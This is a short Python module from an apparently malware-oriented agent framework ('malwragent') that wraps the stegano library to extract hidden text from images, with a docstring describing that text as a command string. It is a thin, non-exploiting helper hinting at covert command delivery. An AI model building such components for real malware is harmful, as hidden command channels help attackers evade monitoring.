# -*- coding: utf-8 -*-
from __future__ import absolute_import

from stegano import lsb

from malwragent.packages.helpers.agentmodule import AgentModule
from malwragent.packages.helpers.agentmodule import Decorators

__class_name__ = 'Stego'
__client_mode__ = True
__server_mode__ = False
__module_type__ = 'Transformation'


class Stego(AgentModule):
    """provides basic stego routines"""

    @Decorators.args(None)  # Decorators.args must be defined at the moment
    def f_extract_text_from_image(self):
        """Extract hidden text from an image object

        :rtype: String
        :return: A text, command string
        """
        input_ = self.settings['input']
        output = lsb.reveal(input_)
        return str(output)
